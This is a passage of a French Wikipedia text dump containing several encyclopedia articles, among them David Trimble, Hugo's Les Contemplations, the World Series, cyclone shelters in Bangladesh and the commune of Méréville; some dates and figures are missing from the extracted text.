En France, deux rues et une allée portent son nom.
À New York est exposé un buste de Golda Meir.

</doc>
<doc id="249202" url="https://fr.wikipedia.org/wiki?curid=249202" title="Snow-kite">
Snow-kite



</doc>
<doc id="249206" url="https://fr.wikipedia.org/wiki?curid=249206" title="T1">
T1

T1, T-1 ou T01 désigne :
Sciences.
Chimie

</doc>
<doc id="249209" url="https://fr.wikipedia.org/wiki?curid=249209" title="Angels and Demons">
Angels and Demons



</doc>
<doc id="249210" url="https://fr.wikipedia.org/wiki?curid=249210" title="Anges et Démons">
Anges et Démons

Anges et Démons est le titre de plusieurs œuvres :

</doc>
<doc id="249213" url="https://fr.wikipedia.org/wiki?curid=249213" title="David Trimble">
David Trimble

David Trimble, baron Trimble, né le à Bangor dans le Comté de Down en Irlande du Nord et mort le , est un homme d'État britannique, Premier ministre d'Irlande du Nord à trois reprises entre 1998 et 2002, et chef du Parti unioniste d'Ulster de 1995 à 2005.
Il a été récompensé du prix Nobel de la paix en 1998, prix partagé avec John Hume, à cette époque chef du Parti social-démocrate et travailliste, pour leurs efforts en vue de la conclusion d'un accord politique en Irlande du Nord qui mèneront à la signature de l'accord du Vendredi saint en 1998.
Biographie.
Au début des années 1970, David Trimble s'engage dans le parti d'extrême droite Vanguard Unionist Progressive Party, lié aux paramilitaires. Il s'est présenté sans succès pour le parti aux élections législatives de 1973 dans la circonscription de North Down, arrivant en dernière position. Il est élu à la Convention constitutionnelle d'Irlande du Nord en 1975 en tant que représentant de la Vanguard et devient co-chef du parti.
Il adhère au Parti unioniste d'Ulster (UUP), le parti dominant en Irlande du Nord, en 1978, après la dissolution de la Vanguard. Il en sera le dirigeant de 1995 à 2005.
En 1990, il est l'un des nord-irlandais siégeant à Londres, à la Chambre des communes.
Il est Premier ministre d'Irlande du Nord à trois reprises entre 1998 et 2002, aux côtés de Seamus Mallon et Mark Durkan comme vice-Premiers ministres.
Il est député de la circonscription de Upper Bann (ville de Portadown) et il est réélu lors des élections législatives de 2001 avec voix (33,50 %).
En 2006 Trimble est élevé à la dignité de pair du royaume en qualité de baron. Il est doté du titre de baron Trimble de Lisnagarvey dans le comté d'Antrim.
En 2007 Trimble devient membre du Parti conservateur (Royaume-Uni) et annonce qu'il veut participer pleinement à la politique du Royaume-Uni sur le plan national. En même temps, il indique qu'il ne souhaite pas faire campagne contre son ancien parti, le Parti unioniste d'Ulster et propose l'idée d'une alliance entre les conservateurs et les unionistes comme celle qui avait existé avant 1974.
Il a notamment signé, avec d'autres lauréats du prix Nobel, un appel demandant qu'une délégation du Comité des droits de l'enfant de l'ONU soit autorisée à rendre visite à Gedhun Choekyi Nyima, un enfant tibétain en résidence surveillée depuis 1995 en Chine, reconnu comme panchen-lama par le dalaï-lama, Tenzin Gyatso. Il compte en 2010 parmi les fondateurs de l"'Initiative des amis d’Israël", une association regroupant des hommes politiques et hommes d'affaires internationaux afin d’utiliser leurs influences pour soutenir les intérêts israéliens.
Il défend le Brexit en 2016, estimant qu'il offre la possibilité de « provoquer une renaissance britannique à l'échelle planétaire. » Il regrette par la suite une trahison du Premier ministre Boris Johnson concernant le statut de l'Irlande du Nord.
L'accord du Vendredi saint.
David Trimble participe à l'élaboration de l'accord du Vendredi saint et il a reçoit le prix Nobel de la paix en 1998, prix partagé avec John Hume.

</doc>
<doc id="249218" url="https://fr.wikipedia.org/wiki?curid=249218" title="Les Contemplations">
Les Contemplations

Les Contemplations est un recueil de poèmes écrit par Victor Hugo et publié en 1856. Il est composé de 158 poèmes, rassemblés en six livres. La plupart de ces poèmes ont été écrits entre 1841 et 1855, mais les plus anciens datent de 1830.
"Les Contemplations" constituent un recueil qui aborde les thèmes de l’amour, la joie, mais aussi de la mort, du deuil et d'une certaine foi mystique. Le souvenir, surtout, y prend une place prépondérante. En effet, Victor Hugo y expérimente le genre de l'autobiographie versifiée. Ce recueil est également un hommage à sa fille Léopoldine Hugo, accidentellement morte noyée dans la Seine à Villequier en 1843.
Contexte.
Bien que prolongeant dans sa première partie le lyrisme des œuvres antérieures comme "Les Rayons et les Ombres" (1840), le recueil des "Contemplations" est aussi une rupture avec ce lyrisme, annonçant une poésie plus sombre. Ainsi, "Les Contemplations" constituent une œuvre majeure qui correspond à une seconde naissance poétique de Victor Hugo, profondément marqué et changé par la disparition de sa fille, qui mènera à des œuvres ultérieures telles que "La Légende des siècles" (1859 - 1883).
Structure du livre.
Le livre s'organise en deux parties, respectivement intitulées "Autrefois" et "Aujourd'hui", comprenant chacune trois chapitres.
À première vue, le recueil semble organisé selon un ordre chronologique, mais Victor Hugo a faussé la date d'écriture de certains de ses poèmes. Il faut en déduire que l'ordre choisi est plus psychologique qu'historique.
Analyse.
"Les Contemplations" comme recueil de l’amour.
L’amour dans "les Contemplations" prend différentes formes. Il peut s’agir de l’amour maladroit du jeune homme, comme dans la "Vieille chanson du jeune temps" : c’est un amour où l’expression des sentiments est maladroite et hésitante. L’amour sensuel a aussi une place importante dans le recueil. La sensualité est présentée comme discrète (comme dans la majorité des poèmes) ou, exceptionnellement, érotique. L’amour est ainsi source de bonheur et de joie, mais est également source de souffrance lorsque l'auteur évoque la mort de sa fille.
Lyrisme amoureux et nature.
Les poèmes de l’amour sont aussi des poèmes de la nature : . Le lyrisme amoureux se mêle au lyrisme de la nature sans qu’ils se confondent. Ce n’est pas l’amour malheureux que Hugo chante, mais, au contraire, l’amour comme source de plénitude, de bonheur à deux et de communion avec la nature.
Le poète exprime la nature et l'amour sous la forme de poèmes brefs, comme s'il cherchait plus à capter un moment fugitif qu’à donner une longue peinture de ses sentiments. Hugo se concentre sur quelques parties de la réalité en donnant ainsi une image fragmentée : il ne fait pas de portrait de pied en cap de la femme qu’il aime, mais évoque sa nuque ou ses pieds et ses cheveux. La nature elle-même est décrite de façon très fragmentaire : Hugo évoque un arbre et ses branches, la rive et les joncs . Dans les poèmes d’amour, l’amour et la nature sont intimement liés, faisant apparaître la nature comme l'espace privilégié de la fusion du poète et de la femme aimée.
"Les Contemplations" comme œuvre du deuil.
"Les Contemplations" est un recueil centré sur la nostalgie et en particulier sur le souvenir de Léopoldine, la fille du poète, noyée dans la Seine avec son mari le , mort qu'apprend Hugo par hasard dans la presse le à Rochefort au retour d'un voyage en Espagne avec Juliette Drouet. La perte de sa fille est l'événement qui détermine la structure du recueil en deux parties, "Autrefois" (1830 - 1843) et "Aujourd'hui" (1843 - 1855). 
Hugo choisit les vers pour raconter la traversée de son deuil, ceux-ci permettant de mettre en forme cette expérience douloureuse et de la dépasser. La contrainte poétique est une manière de canaliser l'affect en coulant l'informel comme dans un moule de formes préexistantes ; le sonnet ou les structures rythmiques.
La destinataire du premier livre de la seconde partie, "Pauca meae" semble être d’abord sa fille défunte, à laquelle Hugo s’adresse directement, notamment dans le célèbre dernier vers du quatorzième poème du livre, "Demain, dès l'aube…": . Le poète, qui ne semble plus à même de comprendre les desseins de Dieu, s’adresse aussi aux autres hommes, car ses souffrances sont celles de tous : « "homo sum" » écrit-il dans la préface. La poésie est un endroit de partage de sentiments universels.
Le titre "Pauca meae", elliptique, signifie en latin "peu de choses pour ma [fille]" , ou "peu de choses de ma [fille]". Il est généralement compris comme "Quelques vers pour ma fille", mais pourrait aussi signifier « le peu qu'il reste de ma fille ». Les moments passés avec Léopoldine sont toujours évoqués de façon vague et fragmentaire : parmi les dix-sept poèmes de "Pauca meae", seuls quatre décrivent des scènes du passé. Si le poète évoque les moments heureux passés avec sa fille et avec ses autres enfants, comme lorsqu'il leur racontait des contes, "Pauca meae" contient surtout des poèmes de la souffrance et du deuil : la douleur est présente dans neuf des dix-sept poèmes composant cette section.
Hugo montre aussi clairement son refus de la mort et ne cesse d’interroger Dieu quant au sens du décès de Léopoldine. Cette mort fait vaciller sa foi et sa confiance en Dieu, et jusqu'à l’idée que le Poète doit se faire messager de Dieu et guide des peuples (idée pourtant ancienne chez Hugo). Parallèlement, Hugo avoue son incapacité à comprendre les desseins de Dieu et sa soumission à la volonté divine. Il esquisse par là l’idée que la vie se termine par un mystère que nul ne peut comprendre.
Quant au ton et au style de Hugo, sa langue et sa poésie se caractérisent par leur simplicité. Les mêmes rimes reviennent d’un poème à un autre. Hugo rejette le pathos ; il a ainsi recours à un double pour parler de ses propres souffrances, donnant ainsi l’impression de parler d’un autre. Il évite d'exagérer son lyrisme personnel, écrivant par exemple , comme pour rejeter un sentimentalisme facile.
La Mystique du poète.
En 1853, ont lieu les séances de tables tournantes chez Delphine de Girardin. Cette expérience permet au poète de se former une nouvelle religion, très précisément évoquée dans le poème des "Contemplations" intitulé « Ce que dit la bouche d'ombre ». Panthéisme et christianisme s'y mêlent pour former une pensée qui relève aussi bien de la religion que de la philosophie.
L'idée-même de « contemplation » (du latin "contemplari", qui signifie aussi bien « regarder attentivement » que « considérer par la pensée ») joue de l'origine religieuse du mot (qui appartient dans l'ancienne Rome à la langue augurale) : il s'agit, pour le songeur (car « rêver », « songer » et « contempler » sont employés presque indifféremment dans le recueil), de fixer son regard sur la nature jusqu'à percevoir, au-delà du visible, le sens abstrait qu'il délivre. Dans le pan de réel délimité par son regard, le contemplateur s'efforce d'interpréter des signes : la nature est un livre où se donne à déchiffrer le texte divin. L'importance accordée par le recueil à la vision doit donc être reliée à la conception hugolienne du divin.
Le dieu de Hugo n'est ni tout à fait impersonnel, ni tout à fait anthropomorphe : il serait plutôt la voix de la conscience, une forme intime et vivante de loi morale. C'est un dieu tout-puissant mais inconnaissable pour l'homme, et dont le christianisme n'offrirait qu'une image approximative, car il s'agirait d'une entité universelle et libérée de toute religion.
Hugo croit au caractère surnaturel de la poésie qui lui permettrait de traduire la voix de l'au-delà. Le poète est pour lui un voyant et un messager de l'infini. Enfin, "Les Contemplations" sont pour Hugo l'occasion d'affirmer sa croyance en l'immortalité de l'âme et en la métempsycose.
Postérité.
Le roman "Les Contemplées" de Pauline Hillier, paru en 2023 à La Manufacture de livres, fait référence aux "Contemplations" de Hugo.
En 2024, l'organiste et compositeur Dominique Chevalier compose "Au bord de l'infini", inspiré par plusieurs extraits des "Contemplations".
Notes et références.
Remarque : pour tous les poèmes sans titre, le numéro du livre en chiffre romain et le numéro du poème en chiffre arabe, ainsi que le premier vers du poème sont cités.

</doc>
<doc id="249219" url="https://fr.wikipedia.org/wiki?curid=249219" title="Série mondiale">
Série mondiale

La Série mondiale (en anglais « World Series ») est la série finale de la Ligue majeure de baseball (MLB) nord-américaine. Elle a lieu en octobre, après la saison régulière et oppose les champions de la Ligue nationale et de la Ligue américaine. Actuellement (voir plus bas), la série se dispute au meilleur de sept rencontres, la première équipe avec quatre victoires décrochant le titre. 
La première Série mondiale est disputée en 1903. Les Americans de Boston menés par leur lanceur Cy Young battent les Pirates de Pittsburgh avec cinq victoires pour trois défaites. En 1904, les Giants de New York, champions de la Ligue nationale, refusent de rencontrer les Pilgrims de Boston au prétexte que le champion de la Ligue américaine leur était inférieur. Depuis 1905, les Séries mondiales se jouent au meilleur de sept rencontres, à l'exception des saisons 1919 à 1921 où elle s'est décidée au meilleur de neuf rencontres.
Les Yankees de New York ont remporté le plus grand nombre de championnat (27) dont cinq consécutivement entre 1949 et 1953. En 2001, les Diamondbacks de l'Arizona remportent le titre majeur à leur quatrième saison d'existence, pour le record du titre gagné le plus hâtivement par un club. Une seule des équipes actuelles, les Mariners de Seattle, n'a jamais participé à une Série mondiale.
L'épreuve prend le nom de « Série mondiale » (ou « "World Series" » en anglais) en référence aux World's Championship Series qui se disputèrent de 1884 à 1890 entre le champion de la Ligue nationale et celui de l'American Association, une ligue majeure disparue à la fin du . On parle également, en Amérique du Nord, de Classique d'automne (ou « "Fall Classic" » en anglais) en raison de son déroulement durant la saison homonyme.
Les champions les plus récents sont les Dodgers de Los Angeles, vainqueurs de la Série mondiale 2025 face aux Blue Jays de Toronto sur le score de quatre parties à trois.
Voir aussi.
Les autres rondes des séries éliminatoires de la Ligue majeure de baseball :

</doc>
<doc id="249226" url="https://fr.wikipedia.org/wiki?curid=249226" title="Didier Lefèvre">
Didier Lefèvre

Didier Lefèvre est un photojournaliste français né le à Versailles et mort le à Morangis. Il a mené des reportages dans de nombreuses régions et effectué des missions au sein de l'ONG Médecins sans frontières, notamment en Afghanistan. Cette expérience a inspiré la série de bande dessinée documentaire "Le Photographe", en collaboration avec Emmanuel Guibert et Frédéric Lemercier, ouvrage qui vaut à leurs auteurs plusieurs distinctions.
Biographie.
Pharmacien et biologiste de formation, Didier Lefèvre devient membre de Médecins sans frontières de 1984 à 1988, d'abord comme logisticien et photographe, puis comme photojournaliste. Il réalise en 1986 un reportage photographique lors de sa première mission en Afghanistan pour l'ONG, alors que le pays est en guerre contre l'URSS. Cette expérience donne lieu à la publication du livre "Le Pays des citrons doux et des oranges amères" (éditions Ouest-France). Les photographies de sa première mission en Afghanistan et le récit de son expérience forment la trame de la bande dessinée "Le Photographe", élaborée en trois volumes avec Emmanuel Guibert et Frédéric Lemercier. Cet ouvrage attire de nombreuses récompenses.
Lefèvre réalise également des reportages au Liberia, au Kosovo sur la ville de Ljubenic, . Ses clichés, qui sont parus dans de nombreux quotidiens et magazines, figurent en 2007 dans une exposition : "BD Reporters", au Centre Georges Pompidou. Lefèvre couvre également la course cycliste Paris-Roubaix ainsi que la campagne présidentielle française en 2007. Il exerce comme salarié pour des agences (comme VU et Editing) mais aussi comme indépendant. Il passe au format numérique avec réticence.
En 2007, il meurt d'une crise cardiaque à son domicile à Morangis. Lefèvre était marié et père de deux enfants.

</doc>
<doc id="249227" url="https://fr.wikipedia.org/wiki?curid=249227" title="Protection paracyclonique au Bangladesh">
Protection paracyclonique au Bangladesh

La protection anti-cyclone au Bangladesh est un système de protection civile développé par ce pays pour mettre à l'abri les populations des effets dévastateurs des cyclones tropicaux.
Situation météorologique.
Le golfe du Bengale, où se trouve le Bangladesh, est particulièrement vulnérable face aux cyclones tropicaux. En effet, leur fréquence y est importante, le golfe a la forme d'un entonnoir peu profond et en plus le terrain est en général peu élevé par rapport au niveau de la mer. Le golfe porte ainsi le surnom de "capitale des ondes de tempêtes". Ceci est particulièrement vrai dans la région du delta du Gange où celles-ci peuvent pénétrer loin à l'intérieur des terres et inonder de vastes régions. On a recensé 142 systèmes tropicaux d'intensité modérée à violente entre 1582 et 1991, certains donnant des onde de tempête de plus de huit mètres de haut. Ceci s'ajoute aux effets des vents violents et des pluies torrentielles et on a déploré des centaines de milliers de victimes durant cette période. Le cyclone de Bhola de 1970, le plus dévastateur de l'histoire, a tué entre et personnes au Pakistan oriental (maintenant Bangladesh). En 1991, le cyclone Gorky fit victimes dans la même région.
Programme.
Depuis ces événements, le Bangladesh s'est protégé en construisant 4 000 abris collectifs sur pilotis le long des côtes. Situés à quatre mètres du sol, ces abris laissent passer les vagues et les débris charriés par l'eau. Pouvant contenir entre 500 et personnes, ils sont équipés de réserves de nourritures, d'eau potable et de toilettes. Les escaliers d'accès ont été spécialement élargis pour permettre l'accès à un maximum de personnes dans un délai très court.
L'alerte cyclonique, déclenchée par les services météorologiques, est relayée par des volontaires du Croissant Rouge présents dans chaque village. Un système de drapeaux flottants dans les marchés signale le niveau de dangerosité. Lors d'une alerte, des enfants circulent dans les rues enjoignant à la population, à l'aide de mégaphones, l'ordre de se rendre dans les abris. Le système anti-cyclone est financé par le gouvernement, l'Union européenne et l'Arabie saoudite. Cette dernière se sert des abris comme écoles coraniques lorsqu'il n'y a pas d'alerte. 
En 1997, un cyclone d'une même ampleur que celui de 1991 ne fit seulement que 150 morts grâce à ce programme.
Problèmes.
Le système n'est cependant pas parfait. Beaucoup de personnes ne quittent leur habitation qu'une fois celle-ci submergée par les eaux, par peur des pillages. 
En novembre 2007, plusieurs heures avant que le cyclone Sidr ne frappe le littoral, l'alerte cyclonique avait fait accourir dans les abris anti-cycloniques une bonne partie de la population des zones à risques. Cependant, certains sont retournés à leurs maisons, lassés d'attendre la tempête et pensant qu'il s'agissait d'une fausse alerte comme celle au tsunami lancée au mois de septembre précédent. Les fonctionnaires locaux ont tenté en vain de les persuader de l'arrivée imminente du cyclone. D'autres ne se sont jamais rendus et des milliers de Bengalis furent ainsi tués parce qu'ils n'avaient pas pris au sérieux les appels des autorités.

</doc>
<doc id="249228" url="https://fr.wikipedia.org/wiki?curid=249228" title="Méréville (Essonne)">
Méréville (Essonne)

Méréville ( ) est une ancienne commune française située dans le département de l'Essonne en région Île-de-France.
Le , elle fusionne avec Estouches pour former la commune nouvelle du Mérévillois.
Ses habitants sont appelés les "Mérévillois".
Géographie.
Situation.
Méréville est située à soixante-quatre kilomètres au sud-ouest de Paris-Notre-Dame, point zéro des routes de France, quarante-quatre kilomètres au sud-ouest d'Évry, quatorze kilomètres au sud-ouest d'Étampes, vingt-quatre kilomètres au sud-est de Dourdan.
Hydrographie.
La commune est traversée par la rivière la Juine. Une station de mesure hydrométrique est implantée dans la commune.
Relief et géologie.
La commune comporte un des sites de la réserve naturelle nationale des sites géologiques de l'Essonne.
Voies de communication et transports.
Méréville est desservie par plusieurs lignes de bus, dont notamment les lignes 316 à 318 du réseau de bus Essonne Sud Ouest.
Occupation des sols simplifiée.
Le territoire de la commune se compose en 2017 de 90,98 % d'espaces agricoles, forestiers et naturels, 3,19 % d'espaces ouverts artificialisés et 5,83 % d'espaces construits artificialisés.
Climat.
Méréville, située en Île-de-France, bénéficie d'un climat océanique dégradé.
Toponymie.
"Merezvilla", "Merelisvilla" au , "Merevillam" en 1190, "Mereville" en 1262.
Au , le nom de la ville est rendu par le latin "Merervilla", ce qui semble indiquer selon Bernard Gineste, un ancien seigneur du lieu répondant au nom d'origine germanique Merhier ("mar-hari"), ou "Merila", bien attesté à l'époque sous la forme latine "Marharius", et encore attesté comme patronyme. Le lieu est aussi nommé "Merilis" dans un document du et "Merervilla" dans le "Liber testanum" de Saint-Martin des Champs au début du .
La commune fut créée en 1793 avec son nom actuel.
La partie la plus élevée du territoire prit le nom de "Bourg Saint Père" par le fait que, pour racheter son excommunication, le seigneur de Méréville y fit installer huit moines venant de Bonneval, dont son frère (d'où "les saints pères" ?). Le territoire de la vallée (château) et celui de la butte (Saint Père), délimités par une croix toujours en place (croix de la Camuse), se réunifieront plus tard.
Histoire.
Antiquité et Moyen Âge.
La ville de "Merervilla" au semble tirer son nom de celui d'un ancien seigneur "Merier".
"Merevillam" de son nom latin, selon une charte de Philippe Auguste de 1198 entérinant le partage d'héritage de Gauthier de Villebéon, était déjà à l'époque de la charte une vieille châtellenie vicomtale. Au elle appartenait aux vicomtes du Puiset qui y possédaient un manoir bien fortifié, dont Henri s'empara à la Saint-Jean de l'été 1042 et dont il démantela les remparts aux dépens du seigneur Hugues Bardoul. Ayant confisqué la seigneurie, il la donna aux vicomtes d'Étampes. 
Mais les du Puiset retrouvèrent plus tard Méréville, car en 1104 une fille de Marc d'Étampes, Liesse, la reçut en dot pour son mariage avec Gui du Puiset, troisième fils du vicomte de Chartres Hugues Blavon, qui prit alors le nom de Gui de Méréville. Son fils Hugues de Méréville lui succéda vers 1144 et décéda en 1186. Ses deux fils, Gui II et Hugues II, se fixèrent du côté de Saint-Denis. Puis Gauthier de Villebéon-Nemours acquit Méréville entre 1186 et 1190. 
En 1255 Jeanne de Méréville, une (arrière)-petite-fille d'Orson et Liesse, en hérita. Par son mariage avec Guillaume IV de Linières, Méréville passa alors dans la famille de Lignières en Berry, où elle resta jusqu'au milieu du , notamment dans la branche cadette fondée par Godemar (II) de Linières († ap. 1386), sire d'Aschères et Rougemont, Marans, Mennetou et Nançay, fils cadet du baron de Lignières Godemar († 1340) et de sa femme Marguerite de Précigny-Laleu, dame de Marans et de Bridoré ; Godemar était lui-même le fils de Guillaume IV de Linières et de Jeanne de Nemours-Méréville.
Godemar (II) de Linières sert notamment en 1367 sous son beau-frère le maréchal Boucicaut ; de sa femme Jeanne, fille de Louis de Brosse de Boussac, il a entre autres enfants : Godemar (III) († 1396 "au voyage de Hongrie" qui mena au désastre de Nicopolis) ; Jean de Linières, évêque de Viviers en 1406-1442 ; et Isabeau, épouse de Jean de Châteauneuf. 
Les Voudenay héritèrent donc de Mennetou, mais pas de Méréville, que Jeanne de Linières avait dû vendre en 1446 à Aignan II de Saint-Mesmin pour payer ses dettes et procès. Les Saint-Mesmin ne gardèrent pas Méréville, qui dès 1456 passa aux Reilhac de Brigueil, dits désormais vicomtes de "Mérinville", suivis par leurs descendants des Monstiers (ou des Moustiers ; à cette famille appartenaient les évêques Charles-François et René).
Époque moderne.
Au début du , Louis XII accorde au seigneur Bertrand de Reilhac, le droit de tenir quatre foires annuelles ainsi qu'un marché par semaine.
Il y eut encore une cession en 1688, au profit des Delpech (dont Jean Delpech, † 1737, conseiller de Grand'Chambre au Parlement) qui devinrent marquis de Mérinville en 1709 (le titre de comte de Mérinville restant attaché depuis 1775 à une possession languedocienne des Monstiers, Rieux).
Au le château est racheté, à la veille de la Révolution française, par le riche financier Jean-Joseph de Laborde et connaît un grand rayonnement, dû en particulier à l'aménagement d'un jardin de type anglo-chinois, dirigé par le peintre Hubert Robert.
Époque contemporaine.
Méréville est occupée par les Allemands du au .
En 1945, paraît un roman d'un jeune professeur, enfant du pays, Jean-Louis Bory. "Mon village à l'heure allemande" retrace la vie (avec ses détails truculents) des Mérévillois durant les six derniers mois de l'Occupation. Avec le soutien de la Grande Colette, il obtiendra le prix Goncourt 1945.
Fusion de communes.
Les communes de Méréville, Estouches et Monnerville ont envisagé en 2016 de fusionner en formant une commune nouvelle. Si le conseil municipal de Monnerville a finalement refusé de participer à la fusion, ceux de Méréville et Estouches ont confirmé en leur volonté de constituer la commune nouvelle du Mérévillois au . Le , le préfet de l'Essonne a signé l'arrêté de création de la commune nouvelle « Le Mérévillois » entre les communes de Méréville et Estouches.
La commune nouvelle est effective au , et Méréville est devenue à cette date une commune déléguée du Mérévillois.
Politique et administration.
Rattachements administratifs et électoraux.
Antérieurement à la loi du , la commune faisait partie du département de Seine-et-Oise. La réorganisation de la région parisienne en 1964 fit que la commune appartient désormais au département de l'Essonne après un transfert administratif effectif au . Elle est rattachée à l'arrondissement d'Étampes.
Pour l'élection des députés, la commune fait partie de la deuxième circonscription de l'Essonne.
La ville était depuis 1801 le chef-lieu du canton de Méréville. Dans le cadre du redécoupage cantonal de 2014 en France, la commune intègre le canton d'Étampes.
Intercommunalité.
La commune, qui n'était jusqu'alors membre d'aucune intercommunalité à fiscalité propre, intègre le la "communauté de communes de l’Étampois Sud-Essonne" créée en 2008. Cette-ci, qui se transforme le en communauté d'agglomération sous le nom de communauté d'agglomération de l'Étampois Sud-Essonne
Tendances et résultats politiques.
Résultats des seconds tours :
Résultats des deuxièmes tours : (sauf pour 2007 : )
Résultats des deux meilleurs scores :
Résultats des deux meilleurs scores :
Résultats des deuxièmes tours :
Résultats des deuxièmes tours :
Politique locale.
Les communes de Méréville, Estouches et Monnerville ont envisagé en 2016 de fusionner en formant une commune nouvelle. Si le conseil municipal de Monnerville a finalement refusé de participer à la fusion, ceux de Méréville et Estouches ont confirmé en leur volonté de constituer la commune nouvelle du Mérévillois au . Le , le préfet de l'Essonne a signé l'arrêté de création de la commune nouvelle « Le Mérévillois » entre les communes de Méréville et Estouches. La commune nouvelle sera effective au .
Population et société.
Enseignement.
Les élèves de Méréville sont rattachés à l'académie de Versailles.
La commune dispose sur son territoire d'une école maternelle publique et de l'école élémentaire Jean-Joseph de Laborde et du collège Hubert-Robert.
Santé.
La commune dispose sur son territoire de la maison de retraite Tournebride.
Sports.
En 2019, Méréville possède 2 terrains de football, 1 terrain de basket-ball, 1 piste athlétique, un terrain multi-activités, 1 gymnase, 3 terrains de tennis plein air, 1 terrain de tennis couvert et 1 piscine découverte (ouverte seulement l'été).
Pour les randonneurs, la commune est traversée par le sentier de grande randonnée de pays du Hurepoix, qui relie la vallée de la Bièvre, à celle de l'Essonne, via l'Yvette, l'Orge et la Juine.
Autres services publics.
La commune de Méréville dispose en 2011 sur son territoire d'une agence postale, d'une brigade de gendarmerie nationale et d'un centre de première intervention.
Lieux de culte.
La paroisse catholique de Méréville est rattachée au secteur pastoral de Saint-Michel-de-Beauce-Étampes et au diocèse d'Évry-Corbeil-Essonnes.
Elle dispose de l'église Saint-Pierre-ès-Liens. Cet édifice comporte des œuvres d'un enfant du village, le peintre Philippe Cara Costea.
Médias.
Les hebdomadaires "Le Républicain" et La République du Centre relatent les informations locales. La commune est en outre dans le bassin d'émission des chaînes de télévision France 3 Paris Île-de-France, IDF1 et Téléssonne intégré à Télif.
Économie.
Emplois, revenus et niveau de vie.
En 2006, le revenu fiscal médian par ménage était de , ce qui plaçait la commune au rang parmi les communes de plus de cinquante ménages que compte le pays et au départemental.
Culture locale et patrimoine.
Patrimoine naturel.
Les berges de la Juine et les bois qui l'entourent ont été recensés au titre des espaces naturels sensibles par le conseil départemental de l'Essonne.
Le cresson est cultivé sur les berges de la Juine depuis plus d'un siècle. Les cressonnières sont en effet un élément remarquable du paysage, labellisées « paysage de reconquête » depuis 1992 par le ministère de l'Environnement, et classées « Site remarquable du goût ».
Le département de l'Essonne est un producteur de cresson de référence : une émission télévisée de France 2 a ainsi présenté en 2017 une visite d'un cressiculteur de Méréville.
En 2016, Méréville reçoit à nouveau le label « Site remarquable du goût » et est nommée « Capitale européenne du Cresson ». Fin , la pratique culturale de ce légume à Méréville est entrée à l'inventaire national du patrimoine culturel immatériel sous la référence "2017_67717_INV_PCI_FRANCE_00378".
Patrimoine architectural.
La halle du début de la Renaissance (env. 1511), son château et son parc, la Colonne Trajane et le lavoir du sont les principaux éléments du patrimoine de la commune.
Au début du , Louis XII accorde au seigneur local, Bertrand de Reilhac, le droit de tenir quatre foires annuelles ainsi qu'un marché par semaine. Ce dernier fit alors édifier la halle que l'on peut encore admirer de nos jours. Ses proportions sont vastes ( x ). Sa charpente et ses quatre rangées de piliers sont en chêne. L'ensemble repose sur des socles de pierre.
La halle accueille aujourd'hui de grandes manifestations culturelles (concerts, opéras, potiers d'art, etc.). Elle est classée aux monuments historiques depuis le . Fête annuelle le week-end de Pâques.
Le château de Méréville est la propriété du conseil départemental de l’Essonne depuis , le domaine de Méréville avec ses "fabriques de jardin" s'apprécie comme le dernier exemple de jardin pittoresque réalisé à la fin du . Ses démembrements sont soit inscrits soit classés au titre des monuments historiques au fil des années entre 1977 et 2003.
Acquise par la commune le et classée monument historique depuis le , la colonne partie des "fabriques" du parc du château. Elle fut construite par l'entrepreneur Pailhet entre 1791 et 1792 d'après un dessin d'Hubert Robert qui la nommait « Obélisque antique » et s'était inspiré de la colonne à décoration sculptée qui fut dédiée en 113 par le Sénat romain à l'empereur Trajan.
Haute de (), il faut gravir pour atteindre le sommet. En 1793, elle fut utilisée par Delambre et son assistant Bellet pour des opérations de mesures de l'arc du méridien terrestre qui devaient servir à déterminer le mètre-étalon (calculé comme la dix millionième partie du quart du méridien terrestre). L'entrée est actuellement gratuite. La colonne offre un panorama à de la Beauce.
Le pont sur la Juine du est classé au titre des monuments historiques le .
Le lavoir, comme le Moulin du pont, faisait partie des "fabriques" du parc de Méréville. Il y a quelques décennies, il était encore le lieu de rendez-vous des Mérévilloises qui lavaient leur linge en commentant l'actualité du village : l'écrivain Jean-Louis Bory nous a laissé de truculentes descriptions de ces scènes. Situé au bord de la Juine, dans un cadre des plus pittoresques, le lavoir fut classé au titre des monuments historiques en 1977.
Le clocher, accolé à l'église, fut réalisé en deux périodes, romane au puis rehaussé au début du gothique au en même temps que le plan général prenait forme de basilique tout en conservant ses ouvertures de style roman. Il reste de l'époque carolingienne des morceaux des bas-côtés. La nef fut rehaussée au et elle connut de nombreuses réparations liées à la guerre de Cent Ans, aux guerres de religion, à un ouragan au , mais surtout à la Révolution française qui en fit une salpêtrière. La voûte s'effondra en 1799 pour n'être relevée, autant que possible à l'identique, qu'en 1824, cette restauration correspondant au retour des propriétaires du château et de leurs successeurs (familles de Laborde et de Saint-Roman).
En , un incendie d'une crèche de Noël endommagea l'intérieur de l'église. Les orientations de Vatican II furent donc appliquées, ce qui valut à l'église un aménagement très dépouillé.
En 1942, Philippe Cara Costea, natif de Méréville, fils du médecin local, avait offert les deux premiers vitraux contemporains (ceux du chœur). En 1970, il la grande Croix de de hauteur, sculptée en creux, située derrière le nouveau maître-autel central, dans le cadre des restaurations. En 1998, il crée les douze vitraux contemporains manquants, représentant des événements marquants de la vie de Jésus (Rosaire), vitraux qu'il avait dessinés plus tôt.
En plus de la "Trilogie Caracostea", des objets ayant survécu à l'incendie furent restaurés.
Des tableaux religieux des ornent les fonts baptismaux et la nef centrale. Au moins trois sont des objets monuments historiques. Ils furent soit donnés par des pèlerins de retour de Saint-Jacques de Compostelle, soit offerts par les descendants de la famille de Laborde.
Quatre vitraux du se trouvent sur les bas-côtés.

</doc>
<doc id="249235" url="https://fr.wikipedia.org/wiki?curid=249235" title="Mereville">
Mereville



</doc>
<doc id="249238" url="https://fr.wikipedia.org/wiki?curid=249238" title="Maison de Tour et Taxis">
Maison de Tour et Taxis

La maison de Tour et Taxis ou la maison princière de Thurn und Taxis (également appelée, en français, maison de La Tour et Tassis, en allemand "von Thurn und Taxis", en italien "della Torre e Tasso", et en néerlandais "Thurn en Tassis") est une famille princière allemande d'origine lombarde qui a dirigé un important service postal en Europe.
Histoire.
La famille Tasso, originaire de Cornello dei Tasso dans la province de Bergame dans la vallée du Brembo en Lombardie, apparaît pour la première fois dans un document avec "Reinerius de Tasso" en 1117. Les postiers étaient donc connus en Italie sous le nom de "bergamaschi".
